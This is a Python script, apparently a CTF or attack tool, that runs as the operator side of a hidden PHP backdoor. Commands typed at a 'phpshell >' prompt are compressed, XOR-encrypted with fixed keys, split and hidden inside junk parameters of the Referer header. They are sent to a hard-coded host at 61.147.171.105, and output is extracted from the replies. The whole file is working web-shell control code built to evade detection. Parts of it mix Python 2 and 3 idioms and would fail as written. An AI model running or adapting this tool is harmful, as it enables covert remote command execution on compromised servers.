import re
import zlib
import string
import urllib
import base64
import requests
from hashlib import md5
from random import randint,choice

def choicePart(seq, amount):
    length = len(seq)
    if length == 0 or length < amount:
        print('Error Input')
        return None
    result = []
    indexes = []
    count = 0
    while count < amount:
        i = randint(0,length-1)
        if not i in indexes:
            indexes.append(i)
            result.append(seq[i])
            count += 1
            if count == amount:
                return result
            
def randBytesFlow(amount):
    result = ''
    for i in range(amount):
        result += chr(randint(0,255))
    return result
    
def randAlpha(amount):
    result = ''
    for i in range(amount):
        result += choice(string.ascii_letters)
    return result
    
def loopXor(text, key):
    result = ''
    lenKey = len(key)
    lenTxt = len(text)
    iTxt = 0

    while iTxt < lenTxt:
        iKey = 0
        while iTxt < lenTxt and iKey < lenKey:
            result += chr(ord(key[iKey]) ^ text[iTxt])
            iTxt += 1
            iKey += 1
    return result
        
    
# config
debugging = False
keyh = "42f7" # $kh
keyf = "e9ac" # $kf
xorKey = keyh + keyf
url = 'http://61.147.171.105:64453/hack.php'
defaultLang = 'zh-CN'
languages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','enUS;q=0.%d','en;q=0.%d']
proxies = {
    'http': 'http://127.0.0.1:8080'
} 

session = requests.Session()
# generate random AcceptLanguage only once each session
langTmp = choicePart(languages, 3)
indexes = sorted(choicePart(range(1,10),3), reverse = True)
acceptLang = [defaultLang]
for i in range(3):
    acceptLang.append(langTmp[i] % (indexes[i],))
    
acceptLangStr = ','.join(acceptLang)

print(acceptLangStr)

init2Char = acceptLang[0][0] + acceptLang[1][0] # $i
md5head = (md5((init2Char + keyh).encode()).hexdigest())[0:3]
md5tail = (md5((init2Char + keyf).encode()).hexdigest())[0:3] + randAlpha(randint(3,8))
print('$i is %s' % (init2Char))
print('md5 head: %s' % (md5head,))
print('md5 tail: %s' % (md5tail,))
# Interactive php shell
cmd = input('phpshell > ')
while cmd != '':
    # build junk data in referer
    query = []
    for i in range(max(indexes) + 1 + randint(0, 2)):
        key = randAlpha(randint(3, 6))
        value = base64.urlsafe_b64encode(randBytesFlow(randint(3, 12)).encode())
        query.append((key, value))
        
    print('Before insert payload:')
    print(query)
    print(urllib.parse.urlencode(query))
    
    # encode payload
    payload = zlib.compress(cmd.encode())
    payload = loopXor(payload, xorKey)
    payload = base64.urlsafe_b64encode(payload.encode())
    payload = md5head + payload.decode()
    
    # cut payload, replace into referer
    cutIndex = randint(2,len(payload)-3)
    payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail)
    iPiece = 0
    for i in indexes:
        query[i] = (query[i][0],payloadPieces[iPiece])
        iPiece += 1
        
    referer = url + '?' + urllib.parse.urlencode(query)
    print('After insert payload, referer is:')
    print(query)
    print(referer)
    
    # send request
    r = session.get(url, headers = {'AcceptLanguage': acceptLangStr, 'Referer': referer}, proxies = proxies)
    html = r.text
    print(html, 12)
    # process response
    pattern = re.compile(r'<%s>(.*)</%s>' % (xorKey, xorKey))
    output = pattern.findall(html)
    if len(output) == 0:
        print('Error, no backdoor response')
        cmd = input('phpshell > ')
        continue
    
    output = output[0]
    print(output)
    output = output.decode('base64')
    output = loopXor(output,xorKey)
    output = zlib.decompress(output)
    print(output)
    cmd = input('phpshell > ')